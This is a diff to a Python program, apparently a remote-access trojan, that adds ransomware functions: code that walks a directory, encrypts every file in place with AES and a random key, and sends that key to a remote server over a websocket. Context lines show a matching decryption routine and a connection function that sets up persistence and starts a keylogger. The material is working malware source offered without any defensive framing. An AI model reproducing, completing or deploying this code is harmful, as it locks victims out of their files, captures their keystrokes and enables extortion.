@@ -593,6 +593,47 @@ def decrypt_directory(path, key_hex):
                 pass
     return decrypted_files
 
+def change_directory(path):
+    try:
+        os.chdir(path)
+        return f"Verzeichnis gewechselt zu: {os.getcwd()}"
+    except Exception as e:
+        return f"Fehler beim Wechseln des Verzeichnisses: {e}"
+
+def encrypt_file(filepath, key):
+    backend = default_backend()
+    iv = secrets.token_bytes(16)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+    encryptor = cipher.encryptor()
+    with open(filepath, "rb") as f:
+        data = f.read()
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    ct = encryptor.update(padded_data) + encryptor.finalize()
+    with open(filepath, "wb") as f:
+        f.write(iv + ct)
+
+def encrypt_directory(path):
+    key = secrets.token_bytes(32)
+    encrypted_files = []
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            try:
+                full_path = os.path.join(root, file)
+                encrypt_file(full_path, key)
+                encrypted_files.append(full_path)
+            except Exception:
+                pass
+    return key, encrypted_files
+
+async def send_encryption_key(websocket, key, path):
+    msg = {
+        "type": "encryption_key",
+        "key_hex": key.hex(),
+        "path": path
+    }
+    await websocket.send(json.dumps(msg))
+
 async def connect_to_server():
     ensure_persistence()
     start_persistent_keylogger()
